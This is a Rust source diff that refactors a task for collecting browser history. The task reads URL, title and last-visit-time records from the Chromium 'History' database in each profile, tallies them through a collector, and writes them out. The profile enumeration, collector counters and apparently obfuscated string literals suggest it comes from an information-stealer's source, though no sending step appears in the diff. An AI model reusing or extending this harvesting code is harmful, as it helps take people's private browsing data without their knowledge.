@@ -1,6 +1,6 @@
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::BrowserData;
-use crate::{History, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all};
+use crate::{History, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all, Extract};
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
 use database::TableRecord;
@@ -33,7 +33,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for HistoryTask {
             &StorageFileSystem,
             |profile| profile / s!("History"),
             s!("Urls"),
-            extract_history_from_record,
+            |record| History::extract(record, (URLS_URL, URLS_TITLE, URLS_LAST_VISIT_TIME)),
         ) else {
             return;
         };
@@ -44,16 +44,4 @@ impl<C: Collector, F: FileSystem> Task<C, F> for HistoryTask {
         collector.get_browser().increase_history_by(history.len());
         let _ = to_string_and_write_all(&history, "\n\n", filesystem, parent);
     }
-}
-
-fn extract_history_from_record<R: TableRecord>(record: &R) -> Option<History> {
-    let url = record.get_value(URLS_URL)?.as_string()?;
-    let title = record.get_value(URLS_TITLE)?.as_string()?;
-    let last_visit_time = record.get_value(URLS_LAST_VISIT_TIME)?.as_integer()?;
-
-    Some(History {
-        url,
-        title,
-        last_visit_time,
-    })
 }
